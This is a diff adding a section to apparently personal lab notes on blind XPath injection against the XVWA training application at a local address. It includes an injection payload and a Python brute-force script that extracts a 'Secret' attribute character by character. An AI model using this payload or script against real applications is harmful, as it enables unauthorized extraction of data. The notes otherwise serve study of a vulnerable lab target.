@@ -587,3 +587,80 @@ if __name__ == '__main__':
     xPathInjection()
 
 ````
+
+If you want optimize the speed of the script you can adjust the size of characters in second_position
+
+We add this information in to our file data.xml:
+
+![](../../Images/Pasted%20image%2020230904174859.png)
+
+## How to discover the message of a attribute
+
+````bash
+search=1' and substring(Secret,1,1)='T&submit=
+````
+
+We know the attribute, we can indicate them, now we are going to use this in our script:
+
+````python
+#!/usr/bin/python3
+
+from pwn import *
+import time, sys, pdb, string, signal, requests
+
+# Ctrl_c
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Global variables
+
+main_url = "http://192.168.1.70/xvwa/vulnerabilities/xpath/"
+characters = string.ascii_letters + ' ' # Characters in lowercase and uppercase
+
+def xPathInjection():
+    
+    data = ""
+
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando ataque de fuerza bruta")
+
+    time.sleep(2)
+
+    p2 = log.progress("Data")
+
+    for first_position in range(1, 71):    
+        for character in characters:                    
+            
+            post_data = { 
+                    'search': "1' and substring(Secret,%d,1)='%s" % (first_position, character),
+                    'submit': '' 
+            }
+
+            r = requests.post(main_url, data=post_data)
+
+            if len(r.text) != 8676 and len(r.text) != 8677:
+                data += character
+                p2.status(data)
+
+                # ----------------------
+                # TODO
+                break
+                # ----------------------
+
+    p1.success("Brute force attack finished")
+    p2.success(data)
+
+if __name__ == '__main__':
+    
+    xPathInjection()
+
+````
+
+Remember that in the variable string we have to add an space, in case do you want number or special characters include it
+
+I put **seventy** characters, if you want to optimize the time, remember you can use **string-length**
+
